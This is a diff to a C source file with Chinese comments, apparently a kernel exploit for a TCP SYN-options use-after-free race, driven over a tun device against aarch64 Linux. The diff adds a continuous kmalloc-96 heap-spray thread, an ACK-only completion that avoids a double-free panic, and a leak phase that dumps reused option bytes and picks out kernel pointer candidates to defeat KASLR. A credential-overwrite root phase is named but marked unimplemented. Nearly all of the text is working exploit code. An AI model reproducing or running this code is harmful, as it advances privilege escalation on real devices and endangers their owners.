@@ -12,11 +12,11 @@
  * 本文件按阶段推进，每阶段都能单独跑，失败不 panic（PANIC_ON_OOPS=y 的机器
  * 上尤其重要）：
  *   probe  —— 只验通道：发 SYN、收 SYNACK、确认选项原样回来
- *   race   —— 竞态打命中，只读不写
- *   leak   —— 命中后立刻喷射并回读，判定对象是否被复用
- *   root   —— 拿 base + cred 指针改写（需要 leak 成功）
+ *   race   —— 边喷淋边打竞态，命中只表现为 SYNACK 选项长度异常
+ *   leak   —— 命中后回读选项区，判定复用并挑出内核 .text 指针候选
+ *   root   —— 拿 base + cred 指针改写（**尚未实现**，Kotlin 侧默认拒绝）
  *
- * 用法：libc98432.so --tun-fd 3 --target 10.7.7.1 --port 47777 [--phase race]
+ * 用法：libsynopt.so --tun-fd 3 --target 10.7.7.1 --port 47777 [--phase race]
  */
 
 #define _GNU_SOURCE
@@ -37,7 +37,7 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "c98432_offsets.h"
+#include "synopt_offsets.h"
 
 /* ------------------------------------------------------------------ 日志 */
 
@@ -58,7 +58,10 @@ static void say(const char *fmt, ...) {
 
 static int g_tun = -1;
 static uint32_t g_dst;
-static uint32_t g_src = 0x0a070763; /* 10.7.7.99，落在 tun 子网里 */
+/* 源地址必须落在 tun 子网内：SYNACK 要靠这个网段的路由回到 tun，
+ * 否则内核会把回包发到真实网卡，我们读不到。README 里“源不在直连子网”
+ * 那条是针对有 raw socket + 嗅探的攻击侧，tun 方案不适用。 */
+static uint32_t g_src = 0x0a070763; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
 static int g_rounds = 4000;
 
@@ -201,6 +204,11 @@ static void *reader(void *arg) {
 #define SPRAY_SOCKS 192
 static int g_spray[SPRAY_SOCKS];
 static int g_spray_n;
+static volatile int g_spray_run;
+static pthread_t g_spray_thread;
+
+/* 标记里的“代”：喷射线程每轮 +1，回读时能看出对象是哪一代的。 */
+static volatile uint32_t g_spray_gen;
 
 static int spray_alloc(uint32_t tag) {
     uint8_t opts[OPT_MAXLEN];
@@ -223,6 +231,35 @@ static int spray_alloc(uint32_t tag) {
 static void spray_free(void) {
     for (int i = 0; i < g_spray_n; i++) close(g_spray[i]);
     g_spray_n = 0;
+}
+
+/* 持续占位。
+ *
+ * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
+ * 真正拷贝之前就被占住，中间只有微秒级窗口。所以竞态期间开一个线程不停
+ * 地“关掉一批 → 重新分配一批”，让 kmalloc-96 一直有我们的对象进出。 */
+static void *spray_worker(void *arg) {
+    (void)arg;
+    while (g_spray_run) {
+        uint32_t gen = ++g_spray_gen;
+        spray_free();
+        spray_alloc(0x53500000u | (gen & 0xffff));
+        usleep(200);
+    }
+    spray_free();
+    return NULL;
+}
+
+static void spray_start(void) {
+    if (g_spray_run) return;
+    g_spray_run = 1;
+    pthread_create(&g_spray_thread, NULL, spray_worker, NULL);
+}
+
+static void spray_stop(void) {
+    if (!g_spray_run) return;
+    g_spray_run = 0;
+    pthread_join(g_spray_thread, NULL);
 }
 
 /* ------------------------------------------------------------ 单次请求 */
@@ -262,6 +299,17 @@ static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
     size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
     tx(pkt, len);
     len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x04);
+    tx(pkt, len);
+}
+
+/* 只发 ACK，不发 RST。
+ *
+ * leak 阶段不能用 [complete]：RST 会走 inet_sock_destruct，把子 socket 的
+ * inet_opt 再 kfree 一次；如果那时它指向的已经是我们的喷射对象，就是一次
+ * double free —— 这台机器 CONFIG_PANIC_ON_OOPS=y，直接重启。 */
+static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
+    uint8_t pkt[128];
+    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
     tx(pkt, len);
 }
 
@@ -322,8 +370,55 @@ struct hit_ctx {
     struct synack s;
 };
 
+/* ------------------------------------------------------ 泄露解析 */
+
+/* 喷射对象里我们写死的标记：build_opts 把 tag 放在 opts[3..6]。
+ * 复用发生后，SYNACK 的选项区就是这份数据的拷贝，所以看 opts[3..6] 即可。 */
+#define SPRAY_TAG0 0x53
+
+static int is_spray_tag(const struct synack *s) {
+    return s->optlen >= 7 && s->opts[3] == SPRAY_TAG0;
+}
+
+/* 把回读到的选项区按 8 字节一组打印，方便人工判断是残留堆还是我们的对象。 */
+static void dump_opts(const struct synack *s) {
+    char line[192];
+    int off = 0;
+    off += snprintf(line + off, sizeof(line) - off, "  opts[%u]:", s->optlen);
+    for (int i = 0; i < s->optlen && i < 48; i++) {
+        off += snprintf(line + off, sizeof(line) - off, " %02x", s->opts[i]);
+        if ((i + 1) % 16 == 0 && i + 1 < s->optlen) {
+            say("%s", line);
+            off = snprintf(line, sizeof(line), "           ");
+        }
+    }
+    if (off > 0) say("%s", line);
+}
+
+/* 从回读数据里挑出像内核 .text 指针的 8 字节（KASLR 基址候选）。
+ *
+ * 只做“看起来像”的判断：aarch64 内核线性映射在 0xffff8... 到 0xffffc...
+ * 之间，且低 12 位通常是页对齐。真正的基址换算要靠 offsets 表。 */
+static int find_text_candidates(const struct synack *s, uint64_t *out, int max) {
+    int n = 0;
+    for (int i = 0; i + 8 <= s->optlen && n < max; i += 8) {
+        uint64_t v = 0;
+        memcpy(&v, s->opts + i, 8);
+        if ((v >> 48) != 0xffff) continue;
+        if ((v & 0xfff) != 0) continue;
+        out[n++] = v;
+    }
+    return n;
+}
+
+/* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
+ *
+ * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
+ * 还是空的，回读到的是残留堆（或者根本读不到）。 */
 static int phase_race(struct hit_ctx *hit) {
     int found = 0;
+    say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
+    spray_start();
     for (int r = 0; r < g_rounds && !found; r++) {
         uint16_t sport;
         uint32_t isn;
@@ -334,23 +429,49 @@ static int phase_race(struct hit_ctx *hit) {
             g_clear++;
         } else if (s.optlen != OPT_MAXLEN) {
             g_hit++;
-            say("命中 r=%d optlen=%u tag=%02x%02x%02x%02x", r, s.optlen,
-                s.opts[3], s.opts[4], s.opts[5], s.opts[6]);
+            say("命中 r=%d optlen=%u gen=%u", r, s.optlen, g_spray_gen);
+            dump_opts(&s);
             hit->sport = sport;
             hit->isn = isn;
             hit->s = s;
             found = 1;
             break;
         }
-        /* 这一轮没命中：把同步 ACK 与重传 SYN 对撞，命中判定依赖下一轮收到的
-         * SYNACK（重传那条路径会在对象被释放后回读它）。 */
+        /* 把同步 ACK 与重传 SYN 对撞：ACK 让 ireq_opt 交给子 socket，
+         * 重传 SYN 走 tcp_v4_send_synack 那条读路径。 */
         fire_pair(sport, isn, s.seq);
         usleep(1500);
         if (g_verbose && (r % 100) == 0)
-            say("r=%d synack=%lu hit=%lu clear=%lu none=%lu",
-                r, g_synack, g_hit, g_clear, g_none);
+            say("r=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
+                r, g_synack, g_hit, g_clear, g_none, g_spray_gen);
     }
+    if (!found) spray_stop();
     return found ? 0 : 1;
+}
+
+/* 泄露：命中后对象已在子 socket 的 inet_opt 里（或被喷淋对象复用）。
+ * 只发 ACK 不发 RST，避免 inet_sock_destruct 再 kfree 一次。 */
+static int phase_leak(struct hit_ctx *hit) {
+    complete_ack_only(hit->sport, hit->isn, hit->s.seq);
+    say("回读命中对象：");
+    dump_opts(&hit->s);
+
+    uint64_t cand[8];
+    int n = find_text_candidates(&hit->s, cand, 8);
+    if (is_spray_tag(&hit->s)) {
+        say("对象已被喷淋占据（标记 0x%02x），说明复用成功", SPRAY_TAG0);
+        say("但内容是我们自己写的，没有泄露价值；需要靠残留堆读内核指针");
+        spray_stop();
+        return 1;
+    }
+    if (n > 0) {
+        for (int i = 0; i < n; i++) say("  内核指针候选[%d] = %#llx", i, (unsigned long long)cand[i]);
+        spray_stop();
+        return 0;
+    }
+    say("没有挑出内核指针候选（optlen=%u）", hit->s.optlen);
+    spray_stop();
+    return 1;
 }
 
 int main(int argc, char **argv) {
@@ -367,7 +488,7 @@ int main(int argc, char **argv) {
 
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
     if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
-    say("c98432: release=%s tun=%d dst=%08x port=%u phase=%s", C98432_RELEASE, g_tun, g_dst, g_port, phase);
+    say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);
 
     pthread_t th;
     if (pthread_create(&th, NULL, reader, NULL) != 0) { FAIL("读线程起不来"); return 2; }
@@ -379,24 +500,7 @@ int main(int argc, char **argv) {
         struct hit_ctx hit;
         rc = phase_race(&hit);
         if (rc == 0 && !strcmp(phase, "leak")) {
-            /* 命中后立刻用可控对象占位，看 SYNACK 是否回送我们的标记 */
-            complete(hit.sport, hit.isn, hit.s.seq);
-            int made = spray_alloc(0x53500000u | (uint32_t)hit.sport);
-            say("喷射 %d 个对象", made);
-            for (int i = 0; i < 200 && g_rx == 0; i++) usleep(100);
-            if (pop(&hit.s)) {
-                say("复用回读 optlen=%u 前 16 字节 %02x%02x%02x%02x %02x%02x%02x%02x "
-                    "%02x%02x%02x%02x %02x%02x%02x%02x",
-                    hit.s.optlen, hit.s.opts[0], hit.s.opts[1], hit.s.opts[2], hit.s.opts[3],
-                    hit.s.opts[4], hit.s.opts[5], hit.s.opts[6], hit.s.opts[7],
-                    hit.s.opts[8], hit.s.opts[9], hit.s.opts[10], hit.s.opts[11],
-                    hit.s.opts[12], hit.s.opts[13], hit.s.opts[14], hit.s.opts[15]);
-                rc = (hit.s.opts[3] == 0x53) ? 0 : 1;
-            } else {
-                say("喷射后没再收到 SYNACK");
-                rc = 1;
-            }
-            spray_free();
+            rc = phase_leak(&hit);
         }
     }
 
